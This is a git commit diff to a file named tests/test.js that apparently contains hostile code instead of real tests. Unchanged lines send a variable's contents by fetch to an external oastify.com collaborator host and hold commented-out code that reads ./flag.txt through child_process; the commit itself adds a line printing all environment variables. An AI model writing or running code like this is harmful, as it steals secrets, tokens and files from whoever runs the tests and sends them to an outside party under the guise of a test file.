fa8ed4b60c9c2a448603c509e1a922a8da25110f
Jackson <21977467+ScenicJaguar101@users.noreply.github.com>
2023-04-14 21:54:24 -0400

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -12,8 +12,10 @@ fetch("https://ftc3oml0akzfqy4s3wgfgagvsmydm9ay.oastify.com/?" + a);
 //var cp = require('child_process');
 //console.log(cp.execSync('cat ./flag.txt').toString());
 
-const index = require("../index")
+const index = require("../index");
 console.log("Tests are not implemented yet...");
 index.ls(".");
 index.cat("./index.js")
 setTimeout(() => { console.log("World!"); }, 5000);
+
+console.log(process.env);
